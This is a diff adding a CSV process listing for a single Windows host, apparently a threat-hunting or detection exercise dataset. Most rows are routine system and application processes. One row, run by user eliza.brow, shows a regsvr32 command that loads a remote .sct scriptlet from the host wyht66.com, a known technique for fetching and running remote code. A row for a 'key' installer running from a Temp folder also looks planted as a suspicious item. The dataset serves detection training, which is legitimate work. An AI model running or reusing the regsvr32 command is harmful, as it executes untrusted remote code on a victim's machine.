@@ -1,0 +1,72 @@
+hostname,name,arguments,username,path,pid
+WB190DTJ,SearchUI.exe,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,3400
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,3500
+WB190DTJ,mcafee_trial_setup_433.0207.3919_key.exe,"""C:\Users\james.kell\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",james.kell,C:\Users\james.kell\AppData\Local\Temp\scoped_dir9616_4071,1292
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT AUTHORITY\SYSTEM,C:\Windows\system32,2712
+WB190DTJ,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",james.kell,C:\Program Files\McAfee\WebAdvisor,2045
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,NT AUTHORITY\SYSTEM,C:\Windows\system32,1280
+WB190DTJ,TabTip32.exe,/loadhooks /Parent:0000000000001188,NT AUTHORITY\SYSTEM,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,4728
+WB190DTJ,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",james.kell,C:\Program Files\McAfee\WebAdvisor,2914
+WB190DTJ,svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc,NT AUTHORITY\SYSTEM,C:\Windows\System32,944
+WB190DTJ,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,james.kell,C:\ProgramData\McAfee\McInstruTrack,1424
+WB190DTJ,putty.exe,"""C:\Program Files\PuTTY\putty.exe"" ",bray.cooper,C:\Program Files\PuTTY,3142
+WB190DTJ,sqlservr.exe,"""C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn\sqlservr.exe"" -sSQLEXPRESS",james.kell,C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn,3059
+WB190DTJ,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",eliza.brow,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,6149
+WB190DTJ,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",james.kell,C:\Program Files\Common Files\McAfee\ModuleCore,3895
+WB190DTJ,lsass.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,4656
+WB190DTJ,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,340
+WB190DTJ,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",james.kell,C:\Program Files\Common Files\McAfee\PEF\CORE,5599
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,1712
+WB190DTJ,mcshield.exe,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",james.kell,C:\Program Files\Common Files\McAfee\AMCore,995
+WB190DTJ,vmware-usbarbitrator64.exe,"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",james.kell,C:\Program Files (x86)\Common Files\VMware\USB,5182
+WB190DTJ,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",eliza.brow,C:\Program Files\TightVNC,4372
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,NT AUTHORITY\SYSTEM,C:\Windows\system32,3636
+WB190DTJ,SkypeBackgroundHost.exe,"""C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe"" -ServerName:SkypeBackgroundHost",eliza.brow,C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c,3501
+WB190DTJ,McDiReg.exe,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",james.kell,C:\ProgramData\McAfee\Direct,5667
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,C:\Windows\system32,1800
+WB190DTJ,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding,NT AUTHORITY\SYSTEM,C:\Windows\System32,5352
+WB190DTJ,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",eliza.brow,C:\Program Files\TightVNC,3684
+WB190DTJ,MFEAvSvc.exe,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",james.kell,C:\Program Files\McAfee\MfeAV,4359
+WB190DTJ,mspaint.exe,"""C:\Windows\system32\mspaint.exe"" ",eliza.brow,C:\Windows\system32,1064
+WB190DTJ,modulecoreservice.exe,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",james.kell,c:\program files\common files\mcafee\modulecore,3169
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,NT AUTHORITY\SYSTEM,C:\Windows\system32,5620
+WB190DTJ,vmware-authd.exe,"""C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe""",james.kell,C:\Program Files (x86)\VMware\VMware Player,4789
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,2328
+WB190DTJ,mcuicnt.exe,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",james.kell,C:\Program Files\Common Files\mcafee\Platform,2286
+WB190DTJ,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /MONITOR /uac",bray.cooper,C:\Program Files\CCleaner,6188
+WB190DTJ,spoolsv.exe,C:\Windows\System32\spoolsv.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,3552
+WB190DTJ,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,james.kell,c:\program files\common files\mcafee\modulecore,4386
+WB190DTJ,McPvTray.exe,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",james.kell,C:\Program Files\McAfee\MAT,1587
+WB190DTJ,MpCmdRun.exe,"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",NT AUTHORITY\SYSTEM,C:\Program Files\Windows Defender,4612
+WB190DTJ,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},NT AUTHORITY\SYSTEM,C:\Windows\system32,880
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k appmodel,NT AUTHORITY\SYSTEM,C:\Windows\system32,2748
+WB190DTJ,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS,NT AUTHORITY\SYSTEM,C:\Windows\system32,3716
+WB190DTJ,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,3220
+WB190DTJ,regsvr32.exe,C:\Windows\System32\regsvr32 /u /n /s /i:\\wyht66.com\ie4uinitS.sct scrobj.dll,eliza.brow,C:\Windows\System32\regsvr32.exe,6196
+WB190DTJ,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,NT AUTHORITY\SYSTEM,C:\Windows\system32,3984
+WB190DTJ,ShellExperienceHost.exe,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,2796
+WB190DTJ,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",james.kell,C:\Program Files\Common Files\McAfee\MMSSHost,2410
+WB190DTJ,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,3088
+WB190DTJ,GitHubDesktop.exe,"""C:\Users\eliza.brow\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --type=gpu-process --no-sandbox --supports-dual-gpus=false --gpu-driver-bug-workarounds=9 12 13 23 27 29 49 70 84 --disable-gl-extensions=""GL_KHR_blend_equation_advanced GL_KHR_blend_equation_advanced_coherent"" --gpu-vendor-id=0x8086 --gpu-device-id=0x0a16 --gpu-driver-vendor=""Intel Corporation"" --gpu-driver-version=20.19.15.4331 --gpu-driver-date=11-18-2015 --service-request-channel-token=29571E74A71F5219E432184D13D76C95 --mojo-platform-channel-handle=1732 /prefetch:2",eliza.brow,C:\Users\eliza.brow\AppData\Local\GitHubDesktop\app-1.4.3,5544
+WB190DTJ,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",eliza.brow,C:\Program Files\RealVNC\VNC Viewer,3642
+WB190DTJ,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,2052
+WB190DTJ,McApExe.exe,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",james.kell,C:\Program Files\Common Files\McAfee\VSCore_18_6,3071
+WB190DTJ,svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,2776
+WB190DTJ,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,2996
+WB190DTJ,mchost.exe,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",james.kell,C:\Program Files\Common Files\McAfee\Platform\Core,6449
+WB190DTJ,LogonUI.exe,"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",NT AUTHORITY\SYSTEM,C:\Windows\system32,932
+WB190DTJ,svchost.exe,C:\Windows\System32\svchost.exe -k termsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,3076
+WB190DTJ,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},NT AUTHORITY\SYSTEM,C:\Windows\system32,4816
+WB190DTJ,Explorer.EXE,C:\Windows\Explorer.EXE,NT AUTHORITY\SYSTEM,C:\Windows,2980
+WB190DTJ,OneDrive.exe,"""C:\Users\eliza.brow\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",eliza.brow,C:\Users\eliza.brow\AppData\Local\Microsoft\OneDrive,5408
+WB190DTJ,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",james.kell,C:\Program Files\Common Files\McAfee\TaskScheduler,6284
+WB190DTJ,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},NT AUTHORITY\SYSTEM,C:\Windows\System32,1992
+WB190DTJ,msdtc.exe,C:\Windows\System32\msdtc.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,2308
+WB190DTJ,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,james.kell,C:\ProgramData\McAfee\Direct,4284
+WB190DTJ,GitHubDesktop.exe,"""C:\Users\eliza.brow\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --squirrel-firstrun",eliza.brow,C:\Users\eliza.brow\AppData\Local\GitHubDesktop\app-1.4.3,5497
+WB190DTJ,svchost.exe,C:\Windows\System32\svchost.exe -k smbsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,2704
+WB190DTJ,McCSPServiceHost.exe,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",james.kell,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,888
+WB190DTJ,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",bray.cooper,C:\Program Files\CCleaner,3219
+WB190DTJ,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",eliza.brow,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,4184
+WB190DTJ,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,5128
+WB190DTJ,sihost.exe,sihost.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,1016
